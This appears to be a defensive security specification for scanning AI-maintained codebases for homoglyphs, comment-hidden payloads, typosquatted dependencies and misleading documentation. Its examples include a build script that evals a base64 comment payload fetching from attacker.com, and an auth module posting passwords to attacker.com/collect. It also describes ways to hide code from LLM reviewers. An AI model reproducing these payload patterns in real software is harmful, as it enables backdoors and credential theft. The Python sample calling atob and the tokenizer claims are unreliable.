# A.E.G.I.S. Standard v1.0

**Full Name**: Agentic Epistemology & Guardrail Implementation Specification
**Version**: 1.0.0
**Status**: Research Preview
**Category**: AI Security Framework
**Date**: 2026-03-12

---

## Abstract

The A.E.G.I.S. Standard defines a security framework for codebases generated or maintained by AI agents. Historical cyber disasters (XZ Utils backdoor, SolarWinds supply chain attack, Log4Shell) reveal vulnerability patterns that emerge when human oversight diminishes. As AI agents assume more development responsibility, these patterns intensify. A.E.G.I.S. translates historical threats into detection heuristics for agentic codebases.

**Positioning**: A.E.G.I.S. is to AI-generated code what OWASP is to web security.

---

## The XZ Utils Threat Model

**CVE-2024-3094** (XZ Utils backdoor) exemplifies the attack surface A.E.G.I.S. addresses:

1. **Social Engineering**: Maintainer compromise via long-term trust building
2. **Obfuscation**: Executable code hidden in test files + base64 encoding
3. **Documentation Mismatch**: Benign README masking malicious build process
4. **Single Point of Failure**: One compromised build pipeline infects millions
5. **Tokenization Exploit**: Control characters invisible to some parsers

**Key Insight**: These vulnerabilities exist because code review is human-centric. AI agents don't get tired, but they lack human paranoia. A.E.G.I.S. provides paranoia-as-a-service.

---

## The Five Specifications

### Spec 1: Multi-Tokenizer Parity Validation

**Threat**: Glitch tokens, Unicode exploits, invisible control characters

**Attack Vector**: Characters that tokenize differently across models create "blind spots" where malicious code is invisible to some reviewers but executable by others.

**Example**:
```python
# This looks like: function calculateArray()
# But the 'a' in 'array' is Cyrillic U+0430, not ASCII 0x61
# GPT-4 tokenizes it as [function, calculate, А, rray]
# Claude tokenizes it as [function, calculateА, rray]
# Result: Different LLMs "see" different function names
def calculateАrray():  # Cyrillic 'а'
    return [exec(atob('malicious_payload'))]
```

**Detection Heuristics**:
1. Scan all source files for non-ASCII characters in identifiers
2. Flag homoglyph attacks (lookalike characters from different Unicode blocks)
3. Detect zero-width characters (U+200B, U+FEFF) in code
4. Cross-reference tokenization across GPT-4, Claude, Gemini models
5. Calculate "tokenizer divergence score": % of tokens that split differently

**Pass/Fail Criteria**:
- **PASS**: Zero non-ASCII identifiers OR all non-ASCII use documented (e.g., i18n variable names in comments)
- **WARNING**: 1-5 suspicious Unicode patterns
- **CRITICAL**: 6+ instances OR zero-width characters detected

**Implementation** (Gemini 3 Flash prompt):
```
Analyze these file contents for Unicode exploitation:
{source_code}

Detect:
1. Non-ASCII characters in function/variable names
2. Homoglyph attacks (Cyrillic 'a' instead of ASCII 'a')
3. Zero-width or control characters
4. Mixed-script identifiers (Latin + Cyrillic + Greek)

Return JSON: { "instances": [{ file, line, character, unicode_block, severity }], "score": 0-100 }
```

---

### Spec 2: AST-Native De-Semantification

**Threat**: Executable code hidden in comments (XZ Utils attack vector)

**Attack Vector**: Comments are semantically inert to parsers, but human-readable. Attackers hide executable payloads in comments, then extract + execute them via build scripts.

**Example**:
```javascript
// build.js
const fs = require('fs');
const code = fs.readFileSync('utils.js', 'utf8');
// Extract base64 from comments
const payload = code.match(/\/\/ PAYLOAD: (.*)/)[1];
eval(Buffer.from(payload, 'base64').toString());

// utils.js
function benignFunction() {
  return "Hello";
}
// PAYLOAD: ZXZhbCgicmVxdWlyZSgnaHR0cCcpLmdldCgnaHR0cDovL2F0dGFja2VyLmNvbS9iYWNrZG9vcicpIik=
```

**Detection Heuristics**:
1. Grep for executable keywords in comments: `eval()`, `exec()`, `subprocess`, `os.system`, `require()`
2. Detect base64 strings in comments (regex: `[A-Za-z0-9+/]{40,}={0,2}`)
3. Scan build scripts (`build.js`, `webpack.config.js`, `.github/workflows/*.yml`) for comment extraction patterns
4. Flag comments with `Function()` constructor, `new Function()`, `eval()` calls
5. Detect obfuscated code (high entropy strings in comments)

**Pass/Fail Criteria**:
- **PASS**: No executable patterns in comments
- **WARNING**: Base64 strings in comments (could be data URIs, not malicious)
- **CRITICAL**: ANY evidence of comment extraction + execution in build process

**Implementation** (Regex + Gemini):
```bash
# Step 1: Regex scan
grep -r "eval\|exec\|subprocess\|Function(" --include="*.js" --include="*.py" .

# Step 2: Gemini analysis
Prompt: "Analyze these comments for dormant executable code:
{comment_blocks}

Flag:
1. Base64 payloads
2. eval() or exec() patterns
3. Obfuscated strings (high entropy)
4. Shell commands

Return: { risk: LOW|MEDIUM|HIGH|CRITICAL, evidence: [...] }"
```

---

### Spec 3: Zero-Trust Epistemic Lineage

**Threat**: Shadow dependencies, dependency confusion, hallucinated packages

**Attack Vector**: AI agents "hallucinate" package names that don't exist. Attackers register these typo names, and automated installs pull malicious code.

**Example**:
```json
// package.json generated by AI
{
  "dependencies": {
    "reqeusts": "^2.0.0",  // Typo! Real package: "requests"
    "colorsafe": "^1.0.0", // Hallucinated! No such package exists
    "lodash": "^4.17.21"   // Legitimate
  }
}
```

Attacker publishes `colorsafe` to npm. Next `npm install` pulls backdoor.

**Detection Heuristics**:
1. Parse dependency manifests: `package.json`, `requirements.txt`, `Cargo.toml`, `go.mod`
2. Cross-reference each package against official registry (npm, PyPI, crates.io, pkg.go.dev)
3. Flag typosquatting: Levenshtein distance < 2 from popular packages
4. Detect `git+https://` dependencies (can be hijacked if repo deleted)
5. Flag version wildcards (`*`, `latest`) in production manifests
6. Check for missing checksums (npm lacks lock file, pip lacks hash verification)

**Pass/Fail Criteria**:
- **PASS**: All dependencies exist in official registry + lock files present
- **WARNING**: git+https dependencies OR version wildcards
- **CRITICAL**: ANY package not found in registry OR typosquatting detected

**Implementation** (API calls + fuzzy matching):
```python
import requests
from difflib import SequenceMatcher

# Check npm registry
def verify_package(name, version):
    resp = requests.get(f"https://registry.npmjs.org/{name}")
    if resp.status_code == 404:
        return "NOT_FOUND"

    # Check typosquatting against top 5000 packages
    for popular in TOP_5000_PACKAGES:
        similarity = SequenceMatcher(None, name, popular).ratio()
        if 0.75 < similarity < 1.0:  # Similar but not exact
            return f"TYPOSQUAT_OF_{popular}"

    return "VALID"
```

---

### Spec 4: Cross-Model Vibe Parity

**Threat**: Poisoned documentation, misleading README, deceptive comments

**Attack Vector**: AI agents trust documentation. If README says "no network calls" but code has `fetch()` everywhere, the agent won't notice. Humans read code; agents read comments.

**Example**:
```python
# auth.py
"""
Secure offline authentication module.
No network calls. All validation happens locally.
FIPS 140-2 compliant encryption.
"""

def authenticate(user, password):
    # Phone home to attacker-controlled server
    response = requests.post("https://attacker.com/collect", json={"user": user, "pwd": password})
    return response.json()["valid"]
```

**Detection Heuristics**:
1. Gemini 3 Flash reads README + top-level docs, extracts claims
2. Second Gemini pass reads actual code structure, extracts capabilities
3. Compare claims vs. reality:
   - Claims "no network" but imports `requests`, `urllib`, `fetch`
   - Claims "read-only" but has `fs.writeFileSync`, `subprocess.run`
   - Claims "GDPR compliant" but logs PII to third-party services
4. Calculate mismatch score: % of claims contradicted by code

**Pass/Fail Criteria**:
- **PASS**: Mismatch score < 10% (minor discrepancies)
- **WARNING**: 10-30% mismatch (outdated docs)
- **CRITICAL**: > 30% mismatch (deliberate deception)

**Implementation** (Two-pass Gemini):
```
# Pass 1: Extract claims
Prompt: "Read this README and list ALL security/behavior claims:
{readme_content}

Return JSON: { claims: [{ category, assertion }] }"

# Pass 2: Verify code
Prompt: "Verify these claims against the codebase:
Claims: {claims}
Code structure: {file_tree + import_statements}

For each claim, return:
{ claim, verified: true|false, evidence: "..." }

Calculate mismatch %."
```

---

### Spec 5: Heterogeneous Mutation Testing

**Threat**: Monoculture risk (single model/toolchain dependency)

**Attack Vector**: If your entire CI/CD uses only ESLint, an attacker who bypasses ESLint rules bypasses ALL static analysis. Monoculture = single point of failure.

**Example**:
```yaml
# .github/workflows/ci.yml
- name: Lint
  run: npm run lint  # Only ESLint

- name: Test
  run: npm test      # Only Jest

- name: Security
  run: npm audit     # Only npm's advisory database
```

If ESLint has a bug (or attacker submits malicious ESLint rule), entire repo is blind.

**Detection Heuristics**:
1. Parse CI/CD configs: `.github/workflows/*.yml`, `.circleci/config.yml`, `Jenkinsfile`
2. Count unique static analysis tools: ESLint, Biome, oxc, TypeScript, Pylint, Ruff, etc.
3. Count unique test frameworks: Jest, Vitest, Mocha, pytest, cargo test
4. Count unique security scanners: npm audit, Snyk, Dependabot, Trivy, Semgrep
5. Calculate diversity score: (# unique tools) / (# stages)

**Pass/Fail Criteria**:
- **PASS**: Diversity score ≥ 2 (at least 2 tools per stage)
- **WARNING**: Diversity score 1-2 (some redundancy)
- **CRITICAL**: Diversity score < 1 (monoculture)

**Implementation** (YAML parsing):
```python
import yaml

def analyze_ci(workflow_file):
    with open(workflow_file) as f:
        config = yaml.safe_load(f)

    linters = set()
    tests = set()
    security = set()

    for job in config.get('jobs', {}).values():
        for step in job.get('steps', []):
            cmd = step.get('run', '')
            if 'eslint' in cmd: linters.add('eslint')
            if 'biome' in cmd: linters.add('biome')
            if 'jest' in cmd: tests.add('jest')
            if 'vitest' in cmd: tests.add('vitest')
            # ... more patterns

    diversity = (len(linters) + len(tests) + len(security)) / 3
    return diversity
```

---

## Validation Corpus

A.E.G.I.S. detection accuracy is validated against this test corpus:

**Vulnerable Repos** (should trigger violations):
1. `xz-utils` (CVE-2024-3094 reproduction) → Spec 2 (comment payloads)
2. `solarwinds-orion` (supply chain simulation) → Spec 3 (shadow dependencies)
3. `log4j-exploit` (Log4Shell patterns) → Spec 2 (executable strings)

**Clean Repos** (should pass):
1. `vercel/next.js` → All specs pass
2. `anthropics/anthropic-sdk-python` → All specs pass
3. `microsoft/TypeScript` → All specs pass

**Ground Truth**: Each test repo has documented expected violations in `AEGIS_EXPECTED.json`.

**Acceptance**: False positive rate < 15%, False negative rate < 5%.

---

## Integration Points

A.E.G.I.S. is framework-agnostic. Integration options:

1. **CI/CD Plugin**: GitHub Action, GitLab CI job
2. **Pre-commit Hook**: Local validation before push
3. **API Service**: `POST /api/scan` with repo URL
4. **IDE Extension**: VSCode plugin with real-time warnings
5. **Third Signal Products**: CCP, Librarian, COE Cookie all implement A.E.G.I.S. validation

---

## Limitations

A.E.G.I.S. v1.0 is a **research preview**, not a complete security solution:

1. **False Positives**: Unicode in legitimate i18n code may trigger Spec 1
2. **False Negatives**: Novel attack vectors not in training corpus
3. **Dependency**: Gemini 3 Flash availability + API costs
4. **Scope**: Detects patterns, not exploit primitives (use Semgrep for that)

**Disclaimer**: A.E.G.I.S. is automated heuristic analysis, not a substitute for manual security audit.

---

## Roadmap

- **v1.1** (Q2 2026): Add Spec 6 (Runtime Behavior Telemetry)
- **v1.2** (Q3 2026): Blockchain-based provenance tracking
- **v2.0** (Q4 2026): Multi-model consensus (GPT-4 + Claude + Gemini vote)

---

## License

A.E.G.I.S. Standard © 2026 Third Signal. Licensed under CC BY-SA 4.0.

Implementation reference available at `ros.thirdsignal.ai/aegis`.

---

**End of Specification**
